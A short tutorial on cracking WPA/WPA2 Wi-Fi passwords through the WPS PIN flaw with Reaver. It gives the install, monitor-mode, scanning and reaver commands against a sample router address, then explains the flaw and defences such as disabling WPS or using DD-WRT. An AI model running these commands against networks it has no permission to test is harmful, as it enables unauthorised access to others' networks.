# Hack WPA or WPA2 Menggunakan Reaver
##   Alat

sudo apt install aircrack-ng reaver

## Hack

>iwconfig
>sudo airmon-ng start wlp2s0
>sudo airodump-ng wlp2s0mon
>sudo reaver -i wlp2s0mon -b A4:2B:B0:00:73:0A -vv

## How Reaver Works

Now that you've seen how to use Reaver, let's take a quick overview of how Reaver works. The tool takes advantage of a vulnerability in something called Wi-Fi Protected Setup, or WPS. It's a feature that exists on many routers, intended to provide an easy setup process, and it's tied to a PIN that's hard-coded into the device. Reaver exploits a flaw in these PINs; the result is that, with enough time, it can reveal your WPA or WPA2 password.

Read more details about the vulnerability at Sean Gallagher's excellent post on Ars Technica.

## How to Protect Yourself Against Reaver Attacks

Since the vulnerability lies in the implementation of WPS, your network should be safe if you can simply turn off WPS (or, even better, if your router doesn't support it in the first place). Unfortunately, as Gallagher points out as Ars, even with WPS manually turned off through his router's settings, Reaver was still able to crack his password.

> In a phone conversation, Craig Heffner said that the inability to shut this vulnerability down is widespread. He and others have found it to occur with every Linksys and Cisco Valet wireless access point they've tested. "On all of the Linksys routers, you cannot manually disable WPS," he said. While the Web interface has a radio button that allegedly turns off WPS configuration, "it's still on and still vulnerable.

So that's kind of a bummer. You may still want to try disabling WPS on your router if you can, and test it against Reaver to see if it helps.

You could also set up MAC address filtering on your router (which only allows specifically whitelisted devices to connect to your network), but a sufficiently savvy hacker could detect the MAC address of a whitelisted device and use MAC address spoofing to imitate that computer.

Double bummer. So what will work?

I have the open-source router firmware DD-WRT installed on my router and I was unable to use Reaver to crack its password. As it turns out, DD-WRT does not support WPS, so there's yet another reason to love the free router-booster. If that's got you interested in DD-WRT, check their supported devices list to see if your router's supported. It's a good security upgrade, and DD-WRT can also do cool things like monitor your internet usage, set up a network hard drive, act as a whole-house ad blocker, boost the range of your Wi-Fi network, and more. It essentially turns your $60 router into a $600 router.

## Referensi

[https://lifehacker.com/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver-5873407](https://lifehacker.com/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver-5873407)